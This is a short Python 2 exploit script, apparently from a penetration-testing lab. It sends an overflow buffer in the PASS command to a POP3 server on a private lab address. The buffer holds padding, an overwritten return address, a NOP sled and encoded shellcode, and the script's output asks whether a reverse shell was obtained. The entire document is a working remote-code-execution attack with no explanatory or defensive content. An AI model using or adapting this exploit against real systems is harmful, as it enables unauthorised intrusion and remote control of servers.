#!/usr/bin/python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
shellcode = ("\xba\x2d\xab\x27\xec\xda\xc4\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
"\x52\x31\x53\x12\x03\x53\x12\x83\xee\xaf\xc5\x19\x0c\x47\x8b"
"\xe2\xec\x98\xec\x6b\x09\xa9\x2c\x0f\x5a\x9a\x9c\x5b\x0e\x17"
"\x56\x09\xba\xac\x1a\x86\xcd\x05\x90\xf0\xe0\x96\x89\xc1\x63"
"\x15\xd0\x15\x43\x24\x1b\x68\x82\x61\x46\x81\xd6\x3a\x0c\x34"
"\xc6\x4f\x58\x85\x6d\x03\x4c\x8d\x92\xd4\x6f\xbc\x05\x6e\x36"
"\x1e\xa4\xa3\x42\x17\xbe\xa0\x6f\xe1\x35\x12\x1b\xf0\x9f\x6a"
"\xe4\x5f\xde\x42\x17\xa1\x27\x64\xc8\xd4\x51\x96\x75\xef\xa6"
"\xe4\xa1\x7a\x3c\x4e\x21\xdc\x98\x6e\xe6\xbb\x6b\x7c\x43\xcf"
"\x33\x61\x52\x1c\x48\x9d\xdf\xa3\x9e\x17\x9b\x87\x3a\x73\x7f"
"\xa9\x1b\xd9\x2e\xd6\x7b\x82\x8f\x72\xf0\x2f\xdb\x0e\x5b\x38"
"\x28\x23\x63\xb8\x26\x34\x10\x8a\xe9\xee\xbe\xa6\x62\x29\x39"
"\xc8\x58\x8d\xd5\x37\x63\xee\xfc\xf3\x37\xbe\x96\xd2\x37\x55"
"\x66\xda\xed\xfa\x36\x74\x5e\xbb\xe6\x34\x0e\x53\xec\xba\x71"
"\x43\x0f\x11\x1a\xee\xea\xf2\x2f\xe4\xf4\x51\x58\xf8\xf4\x54"
"\x23\x75\x12\x3c\x43\xd0\x8d\xa9\xfa\x79\x45\x4b\x02\x54\x20"
"\x4b\x88\x5b\xd5\x02\x79\x11\xc5\xf3\x89\x6c\xb7\x52\x95\x5a"
"\xdf\x39\x04\x01\x1f\x37\x35\x9e\x48\x10\x8b\xd7\x1c\x8c\xb2"
"\x41\x02\x4d\x22\xa9\x86\x8a\x97\x34\x07\x5e\xa3\x12\x17\xa6"
"\x2c\x1f\x43\x76\x7b\xc9\x3d\x30\xd5\xbb\x97\xea\x8a\x15\x7f"
"\x6a\xe1\xa5\xf9\x73\x2c\x50\xe5\xc2\x99\x25\x1a\xea\x4d\xa2"
"\x63\x16\xee\x4d\xbe\x92\x0e\xac\x6a\xef\xa6\x69\xff\x52\xab"
"\x89\x2a\x90\xd2\x09\xde\x69\x21\x11\xab\x6c\x6d\x95\x40\x1d"
"\xfe\x70\x66\xb2\xff\x50")



buffer = 'A'* 2606 + "\x8f\x35\x4a\x5f" + "\x90"*16 +  shellcode + "C" * (3500-2606-4-351-16)

try:
	print "\nSending evil buffer..."
	s.connect(('10.11.23.184',110)) 	# connect to IP, POP3 port
	data = s.recv(1024) 		# receive banner
	s.send('USER test' +'\r\n') 	# send username "test"
	data = s.recv(1024)		# receive reply
	s.send('PASS '+ buffer+'\r\n') 	# send password "test"
	s.close()
	print "\nDone. Did you get a reverse shell?"

except:
	print "Could not connect to POP3!"
